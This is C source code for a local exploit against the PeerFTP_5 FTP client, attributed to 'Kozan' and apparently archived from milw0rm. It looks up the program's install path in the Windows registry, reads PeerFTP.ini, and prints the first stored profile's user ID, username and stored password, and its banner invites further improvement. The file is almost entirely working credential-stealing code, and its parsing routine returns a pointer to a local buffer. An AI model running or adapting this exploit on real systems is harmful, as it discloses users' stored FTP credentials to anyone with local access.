/*****************************************************************

PeerFTP_5 Local Exploit by Kozan

Application: PeerFTP_5
Vendor: Acute Websight Incorporated
http://www.acutewebsight.com/peerftp_5.htm
Vulnerable Description: PeerFTP_5 discloses passwords to local users.

Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan[at]netmagister[dot]com

*****************************************************************/

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define BUFSIZE 100
HKEY hKey;
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

char *userid1, *username1, *password1;

int adresal(char *FilePath,char *Str)
{
       char kr;
       int Sayac=0;
       int Offset=-1;
       FILE *di;
       di=fopen(FilePath,"rb");

       if( di == NULL )
       {
               fclose(di);
               return -1;
       }

       while(!feof(di))
       {
               Sayac++;
               for(int i=0;i<strlen(Str);i++)
               {
                       kr=getc(di);
                       if(kr != Str[i])
                       {
                               if( i>0 )
                               {
                                       fseek(di,Sayac+1,SEEK_SET);
                               }
                               break;
                       }
                       if( i > ( strlen(Str)-2 ) )
                       {
                               Offset = ftell(di)-strlen(Str);
                               fclose(di);
                               return Offset;
                       }
               }
       }
       fclose(di);
       return -1;
}

char *oku(char *FilePath,char *Str)
{

       FILE *di;
       char cr;
       int i=0;
       char Feature[500];

       int Offset = adresal(FilePath,Str);

       if( Offset == -1 )
               return "";

       if( (di=fopen(FilePath,"rb")) == NULL )
               return "";

       fseek(di,Offset+strlen(Str),SEEK_SET);

       while(!feof(di))
       {
               cr=getc(di);
               if(cr == ',')
                       break;
               Feature[i] = cr;
               i++;
       }

       Feature[i] = '\0';
       fclose(di);
       return Feature;
}

int main(void)
{
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                   "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                   0,
                   KEY_QUERY_VALUE,
                   &hKey) == ERROR_SUCCESS)
   {

               lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
                                                      (LPBYTE) prgfiles, &dwBufLen);

       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
               {
                       RegCloseKey(hKey);
                       printf("An error occured!\n");
           exit(1);
       }

       RegCloseKey(hKey);

   }
       else
       {
       RegCloseKey(hKey);
               printf("An error occured!\n");
       exit(1);
   }

       strcat(prgfiles,"\\AcuteWebsight\\PeerFTP_5\\PeerFTP.ini");

       printf("PeerFTP_5 Local Exploit by Kozan\n");
       printf("Credits to ATmaCA\n");
       printf("www.netmagister.com  -  www.spyinstructors.com \n\n");
       printf("This exploit only show the first profile and its password.\n");
       printf("You may improve it freely...\n\n");
       try{

       userid1=oku(prgfiles,"]=");
       printf("UserID 1   : %s\n",userid1);

       char username_temp[BUFSIZE];
       wsprintf(username_temp,"%s,",userid1);
       username1=oku(prgfiles,username_temp);
       printf("UserName 1 : %s\n",username1);

       char pass_temp[BUFSIZE];
       wsprintf(pass_temp,"%s,",username1);
       password1=oku(prgfiles,pass_temp);
       printf("Password 1 : %s\n",password1);

       }catch(...){ printf("An error occured!\n"); exit(1); }

       return 0;

}

// milw0rm.com [2005-02-22]
